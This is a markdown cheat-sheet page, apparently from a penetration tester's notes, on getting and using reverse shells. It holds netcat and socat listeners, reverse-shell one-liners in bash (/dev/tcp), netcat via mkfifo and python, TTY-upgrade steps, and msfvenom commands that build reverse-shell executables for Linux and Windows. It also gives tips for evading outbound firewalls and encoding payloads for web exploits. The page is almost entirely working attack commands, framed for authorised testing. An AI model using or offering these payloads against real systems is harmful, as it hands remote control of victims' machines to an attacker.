+++
title = "shells"
description = "catching shells, making them usable, and the payloads that start them."
weight = 5
+++

A shell is the start of the work, not the end of it. Get a stable one, write down exactly what you ran to get it, and clean up after yourself — anything you drop on a client's box belongs in the report.

## listeners

### netcat
The simplest catcher. `rlwrap` adds arrow keys and history, which raw netcat lacks.

```sh
rlwrap -cAr nc -lvnp <port>
```

### socat
Can catch a fully interactive TTY straight away, if socat exists on the target too.

```sh
# on your machine
socat file:`tty`,raw,echo=0 tcp-listen:<port>
```

```sh
# on the target
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<lhost>:<port>
```

> **trap**
>
> Outbound firewalls often block high ports. If nothing connects, try a port the network already lets out — `443`, `80` or `53`.

## reverse shells

### bash

```sh
bash -c 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1'
```

### netcat without -e

```sh
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <lhost> <lport> > /tmp/f
```

### python

```sh
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<lhost>",<lport>));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
```

> **trap**
>
> - `/dev/tcp` is a bash feature, not a real file. If the command runs under `sh` (common in web exploits), it fails silently — hence the `bash -c` wrapper.
> - In URLs and web forms, encode it first: `&`, `+` and spaces get mangled otherwise.
> - Most modern `nc` builds have no `-e` flag, which is why the `mkfifo` version exists.

## tty upgrade

### python pty + stty
Turns a dumb shell into one with job control, tab completion and working ctrl+c.

```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```sh
# press ctrl+z, then on your machine:
stty raw -echo; fg
```

```sh
# back on the target — match your terminal size (stty size, locally)
export TERM=xterm-256color
stty rows <rows> cols <cols>
```

> **trap**
>
> `stty raw -echo` changes **your** terminal. If the shell dies, your terminal looks broken — type `reset` and press enter, even if you can't see it. In zsh, `stty raw -echo; fg` must be on one line or it won't take.

## payloads

### msfvenom
Generates standalone payloads for most platforms and formats.

```sh
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f elf -o shell.elf
```

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f exe -o shell.exe
```

> **trap**
>
> Watch the underscore. `shell_reverse_tcp` is **stageless** and works with plain netcat. `shell/reverse_tcp` is **staged** — it needs Metasploit's `multi/handler` to send the second stage, and netcat will just hang.
